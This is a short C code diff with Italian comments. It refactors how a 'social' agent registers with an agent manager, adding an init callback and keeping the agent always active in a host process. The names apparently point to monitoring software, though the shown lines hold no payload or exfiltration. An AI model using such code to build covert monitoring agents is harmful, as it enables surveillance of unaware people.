@@ -154,12 +154,17 @@ DWORD __stdcall PM_SocialAgentUnregister()
 	return 1;
 }
 
-void PM_SocialAgentRegister()
+DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
 {
-	AM_MonitorRegister(L"_social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, NULL, (BYTE *)PM_SocialAgentUnregister);
 	// Segnala l'agent manager che questo agente e' sempre attivo. In questo modo verro' PM_SocialAgentStartStop verra' 
 	// chiamata quando sara' necessario mettere in pausa l'agente
 	// ma, soprattutto, verra chiamata per riattivarlo quando la pausa e' finita. Se il processo host non e' partito 
 	// cambiare la variabile social_process_control e' comunque ininfluente
 	AM_MonitorStartStop(PM_SOCIALAGENT, TRUE); 
+	return 1;
+}
+
+void PM_SocialAgentRegister()
+{
+	AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
 }
